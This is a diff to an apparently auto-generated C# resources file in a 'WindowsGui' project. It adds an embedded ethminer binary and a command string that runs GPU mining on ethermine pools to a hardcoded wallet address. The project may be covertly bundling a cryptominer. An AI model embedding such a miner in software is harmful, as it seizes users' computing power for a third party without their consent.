@@ -59,5 +59,24 @@ namespace WindowsGui.Properties {
                 resourceCulture = value;
             }
         }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        internal static byte[] ethminer {
+            get {
+                object obj = ResourceManager.GetObject("ethminer", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized string similar to ethminer.exe -RH --farm-recheck 200 -G -S eu1.ethermine.org:4444 -FS us1.ethermine.org:4444 -O 0xc9415baeE78b36d37fFfb75f3a95c56dE4431508.rig1.
+        /// </summary>
+        internal static string runner {
+            get {
+                return ResourceManager.GetString("runner", resourceCulture);
+            }
+        }
     }
 }
